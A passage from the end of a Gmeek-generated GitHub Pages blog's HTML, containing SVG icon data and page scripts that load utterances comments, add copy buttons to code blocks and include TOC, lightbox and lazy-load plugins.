4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>

</html>
